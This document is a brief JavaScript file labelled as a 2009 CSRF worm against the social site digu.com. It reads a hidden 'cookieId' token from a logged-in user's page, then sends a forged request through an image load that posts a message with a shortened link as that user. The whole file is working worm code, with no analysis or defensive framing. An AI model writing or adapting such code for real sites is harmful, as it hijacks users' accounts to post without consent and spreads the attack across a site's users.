// digu.com CSRF worm by mingcheng 20090512
$.ajax({
    url: "/jump?aid=index",
    type: "GET",
    success:function(o) {
        var token = (/<input type="hidden" id="cookieId" name="cookieId" value="(.*)" \/>/.exec(o))[1];
        if (token) {
            var msg = '缅怀逝去的同胞，生者坚强死者长存 http://is.gd/zo0E';
            var request = 'http://digu.com/jump?aid=addLekuData&cookieId=' + token + '&tId=undefined&text=' + msg + '&tw_userId=undefined&type=1';
            document.body.appendChild(new Image().src = request);
        }
    }
});
